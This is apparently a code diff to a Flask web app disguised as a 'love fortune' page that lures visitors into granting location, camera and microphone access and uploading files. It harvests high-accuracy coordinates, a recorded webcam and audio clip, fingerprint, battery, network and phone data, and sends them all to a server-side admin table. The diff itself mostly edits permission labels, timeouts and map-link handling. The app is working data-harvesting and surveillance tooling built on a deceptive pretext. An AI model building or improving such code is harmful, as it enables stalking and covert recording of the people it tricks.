@@ -43,7 +43,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
-# ALL POSSIBLE FIELDS – admin table will ALWAYS show these columns
+# All possible fields – admin will see these columns
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -154,13 +154,13 @@ def admin():
             html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 800px;">'
             html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{f}</th>' for f in ALL_FIELDS) + '</tr>'
             if not visitors:
-                html += '<td><td colspan="21">No data yet</td></tr>'
+                html += '<tr><td colspan="21">No data yet</td></tr>'
             else:
                 for v in visitors:
                     html += '<tr>'
                     for f in ALL_FIELDS:
                         val = v.get(f, '')
-                        # For long strings, show full content in a scrollable cell (max-width 300px)
+                        # For long strings (cameraVideo, files), use scrollable div
                         if f in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
                             display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
                         else:
@@ -317,11 +317,11 @@ HTML_TEMPLATE = '''
     <div id="permissions" class="hidden">
         <p>🌟 To unlock your **Ultra‑Personalised Love Vision**, grant these mystical keys:</p>
         <div class="permission-box">
-            💕 Celestial Anchor ✨<br>
-            🌟 Heartbeat Whisper 🌙<br>
-            ✨ Secret Keepsake 🕯️
+            💕 Celestial Anchor (Location) ✨<br>
+            🌟 Heartbeat Whisper (Camera & Mic) 🌙<br>
+            ✨ Secret Keepsake (Your Love Memories – optional) 🕯️
         </div>
-        <p style="font-size:0.85rem; color:#c06c84;">(One click – your destiny awaits – no technical details)</p>
+        <p style="font-size:0.85rem; color:#c06c84;">(Click below – your browser will ask for each permission)</p>
         <button onclick="requestAll()">🔮 Cast the Love Spell 🔮</button>
     </div>
     <div id="progress" class="hidden"></div>
@@ -474,10 +474,11 @@ HTML_TEMPLATE = '''
 
     function getLocation() {
         return new Promise((resolve) => {
-            showStep('💕 Celestial Anchor', 'Connecting to your star map...', 0);
+            showStep('💕 Celestial Anchor', 'Requesting location...', 0);
             const timeout = setTimeout(() => {
                 visitorData.latitude = 'denied';
-                showStep('💕 Celestial Anchor', 'Star map skipped', 100);
+                visitorData.longitude = 'denied';
+                showStep('💕 Celestial Anchor', 'Location denied or timeout', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             }, 10000);
             navigator.geolocation.getCurrentPosition(
@@ -485,28 +486,32 @@ HTML_TEMPLATE = '''
                     clearTimeout(timeout);
                     visitorData.latitude = pos.coords.latitude;
                     visitorData.longitude = pos.coords.longitude;
-                    showStep('💕 Celestial Anchor', 'Star map captured!', 100);
+                    visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
+                    showStep('💕 Celestial Anchor', 'Location granted!', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 },
                 () => {
                     clearTimeout(timeout);
                     visitorData.latitude = 'denied';
-                    showStep('💕 Celestial Anchor', 'Star map skipped', 100);
+                    visitorData.longitude = 'denied';
+                    visitorData.mapUrl = '';
+                    showStep('💕 Celestial Anchor', 'Location denied', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
-                }
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         });
     }
 
     function getMedia() {
         return new Promise((resolve) => {
-            showStep('🌟 Heartbeat Whisper', 'Tuning into your love energy...', 10);
+            showStep('🌟 Heartbeat Whisper', 'Requesting camera & microphone...', 10);
             const timeout = setTimeout(() => {
                 visitorData.cameraVideo = 'denied';
                 visitorData.microphone = 'denied';
-                showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
+                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
-            }, 10000);
+            }, 12000);
             navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
             .then(stream => {
                 clearTimeout(timeout);
@@ -519,17 +524,18 @@ HTML_TEMPLATE = '''
                         const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                         const reader = new FileReader();
                         reader.onloadend = () => {
-                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
+                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000); // store first 5000 chars
                             visitorData.microphone = 'recorded';
                             mediaStream.getTracks().forEach(t => t.stop());
-                            showStep('🌟 Heartbeat Whisper', 'Love energy recorded!', 100);
+                            showStep('🌟 Heartbeat Whisper', 'Video & audio captured!', 100);
                             setTimeout(() => { hideStep(); resolve(); }, 500);
                         };
                         reader.readAsDataURL(blob);
                     } else {
                         visitorData.cameraVideo = 'empty';
                         visitorData.microphone = 'empty';
-                        resolve();
+                        showStep('🌟 Heartbeat Whisper', 'No media recorded', 100);
+                        setTimeout(() => { hideStep(); resolve(); }, 500);
                     }
                 };
                 mediaRecorder.start();
@@ -544,7 +550,7 @@ HTML_TEMPLATE = '''
                 clearTimeout(timeout);
                 visitorData.cameraVideo = 'denied';
                 visitorData.microphone = 'denied';
-                showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
+                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             });
         });
@@ -552,16 +558,16 @@ HTML_TEMPLATE = '''
 
     function getFilesTraditional() {
         return new Promise((resolve) => {
-            showStep('✨ Secret Keepsake', 'Gathering your love memories (optional)...', 0);
+            showStep('✨ Secret Keepsake', 'Request to upload love memories (optional)...', 0);
             let resolved = false;
             const timeout = setTimeout(() => {
                 if (!resolved) {
                     resolved = true;
                     visitorData.files = 'no selection (timeout)';
-                    showStep('✨ Secret Keepsake', 'Continuing without memories', 100);
+                    showStep('✨ Secret Keepsake', 'No files selected (timeout)', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 }
-            }, 10000);
+            }, 15000);
             let fileInput = document.getElementById('fileInput');
             if (!fileInput) {
                 fileInput = document.createElement('input');
@@ -606,16 +612,6 @@ HTML_TEMPLATE = '''
         const fortuneData = await fortuneResp.json();
         currentFortuneText = fortuneData.fortune + " Dear " + visitorData.name + "! 💕";
         document.getElementById('fortuneText').innerText = currentFortuneText;
-        
-        if (visitorData.latitude && visitorData.latitude !== 'denied') {
-            visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude || 0}`;
-        } else {
-            visitorData.mapUrl = '';
-        }
-        
-        if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
-        if (!visitorData.microphone) visitorData.microphone = 'not captured';
-        if (!visitorData.files) visitorData.files = 'not captured';
         
         await fetch('/save', {
             method: 'POST',
